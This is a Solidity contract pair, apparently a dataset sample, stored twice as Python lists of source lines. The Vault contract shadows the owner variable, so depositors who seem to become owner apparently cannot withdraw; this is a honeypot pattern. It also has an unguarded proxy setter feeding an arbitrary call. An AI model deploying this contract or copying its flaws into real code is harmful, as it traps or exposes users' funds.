['pragma solidity ^0.4.17;\n', '\n', 'contract TokenProxy  {\n', '    address public Proxy; bytes data;\n', '    modifier onlyOwner { if (msg.sender == Owner) _; }\n', '    function transferOwner(address _owner) onlyOwner { Owner = _owner; }\n', '    address public Owner = msg.sender;\n', '    function proxy(address _proxy)  { Proxy = _proxy; }\n', '    function execute() returns (bool) { return Proxy.call(data); }\n', '}\n', '\n', 'contract Vault is TokenProxy {\n', '    mapping (address => uint) public Deposits;\n', '    address public Owner;\n', '\n', '    function () public payable { data = msg.data; }\n', '    event Deposited(uint amount);\n', '    event Withdrawn(uint amount);\n', '    \n', '    function Deposit() payable {\n', '        if (msg.sender == tx.origin) {\n', '            Owner = msg.sender;\n', '            deposit();\n', '        }\n', '    }\n', '    \n', '    function deposit() payable {\n', '        if (msg.value >= 1 ether) {\n', '            Deposits[msg.sender] += msg.value;\n', '            Deposited(msg.value);\n', '        }\n', '    }\n', '    \n', '    function withdraw(uint amount) payable onlyOwner {\n', '        if (amount>0 && Deposits[msg.sender]>=amount) {\n', '            msg.sender.transfer(amount);\n', '            Withdrawn(amount);\n', '        }\n', '    }\n', '}']
['pragma solidity ^0.4.17;\n', '\n', 'contract TokenProxy  {\n', '    address public Proxy; bytes data;\n', '    modifier onlyOwner { if (msg.sender == Owner) _; }\n', '    function transferOwner(address _owner) onlyOwner { Owner = _owner; }\n', '    address public Owner = msg.sender;\n', '    function proxy(address _proxy)  { Proxy = _proxy; }\n', '    function execute() returns (bool) { return Proxy.call(data); }\n', '}\n', '\n', 'contract Vault is TokenProxy {\n', '    mapping (address => uint) public Deposits;\n', '    address public Owner;\n', '\n', '    function () public payable { data = msg.data; }\n', '    event Deposited(uint amount);\n', '    event Withdrawn(uint amount);\n', '    \n', '    function Deposit() payable {\n', '        if (msg.sender == tx.origin) {\n', '            Owner = msg.sender;\n', '            deposit();\n', '        }\n', '    }\n', '    \n', '    function deposit() payable {\n', '        if (msg.value >= 1 ether) {\n', '            Deposits[msg.sender] += msg.value;\n', '            Deposited(msg.value);\n', '        }\n', '    }\n', '    \n', '    function withdraw(uint amount) payable onlyOwner {\n', '        if (amount>0 && Deposits[msg.sender]>=amount) {\n', '            msg.sender.transfer(amount);\n', '            Withdrawn(amount);\n', '        }\n', '    }\n', '}']